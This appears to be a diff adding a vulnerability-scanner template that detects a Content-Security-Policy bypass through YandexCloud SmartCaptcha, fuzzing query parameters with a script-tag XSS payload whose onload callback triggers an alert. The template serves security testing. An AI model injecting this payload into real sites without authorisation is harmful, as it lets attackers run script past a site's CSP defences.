@@ -1,0 +1,55 @@
+id: yandexcloud-smartcaptcha-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - YandexCloud SmartCaptcha
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,yandexcloud-smartcaptcha,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "yandexcloud.net"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: yandexcloud_smartcaptcha_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://smartcaptcha.yandexcloud.net/captcha.js?render=onload&onload=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "yandexcloud_smartcaptcha_csp_xss == true"
+# digest: 4b0a00483046022100bef8c2218d5be5dd7bde364403dac6a249bc88655bf6fd1807b79b27f9e17788022100d5132299c9cf9eb3ab2188eeb67ec2bf21da6166deda304183c10bf5e24b0ce1:922c64590222798bb761d5b6d8e72950
